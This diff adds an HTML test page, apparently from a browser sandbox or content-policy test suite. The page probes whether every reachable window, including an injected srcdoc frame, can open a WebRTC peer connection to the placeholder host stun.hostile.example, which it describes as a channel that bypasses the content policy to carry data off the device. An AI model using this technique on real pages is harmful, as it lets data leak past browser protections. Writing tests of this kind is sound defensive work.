@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Peer connection</title>
+    <script src="shared/hostile.js"></script>
+  </head>
+  <body>
+    <h1>Hostile: a peer connection</h1>
+    <!-- A frame in the page's own markup, parsed before any lesson script. -->
+    <iframe srcdoc="<script>try { parent.__hostileVisit(window, 'srcdoc in the page markup') } catch (e) {}</script>"></iframe>
+    <pre id="seen"></pre>
+    <script>
+      // Tries to open a peer connection, which the content policy does not
+      // govern, from every window it can reach. A connection to a STUN
+      // server would carry anything out of the device.
+      hostile.ready();
+      hostile.everyWindow(function (win, how) {
+        var Peer = win.RTCPeerConnection || win.webkitRTCPeerConnection || win.mozRTCPeerConnection;
+        if (!Peer) {
+          hostile.show(how, 'no peer connection');
+          return;
+        }
+        var connection = new Peer({ iceServers: [{ urls: 'stun:stun.hostile.example:3478' }] });
+        connection.createDataChannel('out');
+        connection.createOffer().then(function (offer) { return connection.setLocalDescription(offer); }).catch(function () {});
+        hostile.show(how, 'peer connection made');
+      }, hostile.done);
+    </script>
+  </body>
+</html>
